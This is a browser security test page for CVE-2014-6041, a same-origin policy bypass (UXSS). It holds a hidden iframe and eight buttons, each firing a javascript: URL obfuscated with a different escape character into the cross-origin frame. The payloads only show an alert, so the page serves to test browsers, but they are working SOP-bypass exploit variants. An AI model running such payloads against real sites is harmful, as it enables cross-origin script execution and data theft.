---
layout: default
title: SOP Bypass - Testcase 9
permalink: /sop/new/9
---

# SOP Bypass - Testcase 9

Testing for SOP bypass using escape characters
<iframe height="0" width="0" name="CVE-2014-6041" src="https://web.archive.org/web/20180831120259if_/https://www.bing.com/" style="display:none;" data-ruffle-polyfilled=""></iframe>

<input type="button" id="btn_test" class="test" value="Run Test Case 1" onclick="window.open('\u0000javascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 2" onclick="window.open('jav\nascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 3" onclick="window.open('jav\rascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 4" onclick="window.open('javas\tcript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 5" onclick="window.open('javas\fcript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 6" onclick="window.open('javasc\bript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 7" onclick="window.open('java\vscript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">
<input type="button" id="btn_test" class="test" value="Run Test Case 8" onclick="window.open('java\0script:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">

**Note:**
If page loads popup and displays an alert box "Accessed Property of bing.com, your browser is vulnerable to SOP bypass."
